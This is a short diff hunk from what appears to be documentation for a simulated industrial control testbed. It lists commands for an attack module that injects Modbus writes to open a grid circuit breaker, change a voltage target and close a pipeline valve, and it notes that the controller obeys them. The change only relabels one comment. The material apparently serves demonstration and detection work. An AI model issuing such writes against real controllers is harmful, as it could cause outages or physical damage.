@@ -2,7 +2,7 @@
 
     python -m sentinel.attacks.modbus_inject coil 0 0          # grid: open CB-101
     python -m sentinel.attacks.modbus_inject register 1 1180   # grid: AVC target 11.80 kV
-    python -m sentinel.attacks.modbus_inject --port 5021 coil 1 0   # oil: close pipeline valve V-102
+    python -m sentinel.attacks.modbus_inject --port 5021 coil 1 0   # pipeline: close MOV-201
     python -m sentinel.attacks.modbus_inject --port 5020 read        # mirror of live telemetry
 
 No MQTT, no Sentinel API: this is the attacker's path.  The controller obeys,
